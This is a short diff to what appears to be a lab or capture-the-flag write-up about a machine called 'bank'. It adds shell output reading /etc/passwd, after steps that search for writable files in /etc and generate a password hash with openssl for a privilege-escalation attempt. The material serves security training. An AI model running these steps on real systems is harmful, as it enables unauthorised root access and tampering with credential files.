@@ -605,6 +605,8 @@ www-data@bank:/tmp$ find /etc -writable 2>/dev/null
 ```bash
 www-data@bank:/tmp$ openssl passwd -1 gzzcoo
 $1$eb5EWdLO$tyxkHG/AFdZsl8iK62EQu/
+www-data@bank:/tmp$ cat /etc/passwd | grep root
+root:x:0:0:root:/root:/bin/bash
 ```
 
 
